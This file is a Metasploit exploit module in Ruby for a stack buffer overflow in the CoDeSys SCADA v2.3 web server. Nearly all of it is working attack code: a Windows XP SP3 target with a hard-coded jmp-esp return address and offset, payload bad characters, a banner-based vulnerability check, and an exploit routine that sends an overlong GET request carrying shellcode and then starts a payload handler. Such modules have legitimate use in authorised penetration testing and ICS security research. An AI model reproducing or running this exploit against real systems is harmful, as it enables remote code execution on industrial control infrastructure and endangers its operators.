##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'            => 'CoDeSys SCADA v2.3 Webserver Stack Buffer Overflow',
			'Description'     => %q{
				This module exploits a remote stack buffer overflow vulnerability in
				3S-Smart Software Solutions product CoDeSys Scada Web Server Version 1.1.9.9.
			},
			'License'         => MSF_LICENSE,
			'Author'          =>
				[
					'Celil UNUVER', # Original discovery and exploit
					'TecR0c',       # Module Metasploit
					'sinn3r'
				],
			'References'      =>
				[
					[ 'URL', 'http://www.exploit-db.com/exploits/18187/' ],
					[ 'URL', 'http://www.us-cert.gov/control_systems/pdf/ICS-ALERT-11-336-01A.pdf' ]
				],
			'DefaultOptions'  =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'false',
					'InitialAutoRunScript' => 'migrate -f'
				},
			'Platform'        => 'win',
			'Payload'         =>
				{
					'size'     => 4000,
					'BadChars' => "\x00\x09\x0a\x3f\x20\x23\x5e",
				},

			'Targets'         =>
				[
					[
						'Windows XP SP3',
						{
							'Ret'    => 0x7E4456F7,
							'Offset' => 775
						}
					], # jmp esp user32
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 02 2011',
			'DefaultTarget'  => 0))

		register_options([Opt::RPORT(8080)], self.class)
	end

	def check
		connect
		sock.put("GET / HTTP/1.1\r\n\r\n")
		res = sock.get(-1, 3)
		disconnect

		# Can't flag the web server as vulnerable, because it doesn't
		# give us a version
		vprint_line(res)
		if res =~ /3S_WebServer/
			return Exploit::CheckCode::Detected
		else
			return Exploit::CheckCode::Safe
		end
	end

	def exploit
		connect

		buffer =  rand_text(target['Offset'])
		buffer << [target.ret].pack('V')
		buffer << make_nops(8)
		buffer << payload.encoded

		sploit = "GET /#{buffer} HTTP/1.0\r\n\r\n\r\n"

		print_status("Trying target #{target.name}...")
		sock.put(sploit)
		res = sock.recv(1024)
		print_line(res)

		handler
		disconnect
	end
end

=begin
target.ret verified on:
- Win XP SP3 unpatched
- Win XP SP3 fully-patched
- Win XP SP3 fully-patched with Office 2007 Ultimate SP2 installed
=end
